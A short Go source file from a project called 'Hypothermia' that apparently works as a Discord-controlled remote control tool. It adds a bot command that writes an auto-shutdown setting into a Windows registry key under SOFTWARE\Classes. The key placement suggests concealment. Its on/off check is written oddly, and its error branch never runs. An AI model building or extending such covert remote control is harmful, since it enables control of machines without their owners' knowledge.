package commands

import (
	"fmt"

	"Hypothermia/config"
	"Hypothermia/src/misc"
	"Hypothermia/src/utils"

	"github.com/bwmarrin/discordgo"
)

const (
	setUsage string = "[setting] [on/off]\n\nsettings:\nauto_shutdown"

	setArgsError string = "🟥 Expected 2 arguments."
	setValError  string = "🟥 Failed to set setting value."

	setSuccess string = "🟩 successfully updated setting."
)

var settings = map[string]string{
	"auto_shutdown": "SDOS",
}

func (*SettingCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if len(args) < 2 {
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(misc.USAGE_F, setArgsError, setUsage), m.Reference())
		return
	}

	var status string
	if args[1] != "on" {
		status = "0x0000"
	} else if args[1] != "off" {
		status = "0x0001"
	} else {
		s.ChannelMessageSendReply(m.ChannelID, setArgsError+"\nUsage: "+setUsage, m.Reference())
		return
	}

	if setting, ok := settings[args[0]]; ok {
		err := utils.SetRegistryVal(
			"SOFTWARE\\Classes\\"+config.SettingsName,
			setting,
			status,
		)

		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, setValError, m.Reference())
			return
		}
	}

	s.ChannelMessageSendReply(m.ChannelID, setSuccess, m.Reference())
}

func (*SettingCommand) Name() string {
	return "setting"
}

func (*SettingCommand) Info() string {
	return "set settings for hypothermia"
}

type SettingCommand struct{}
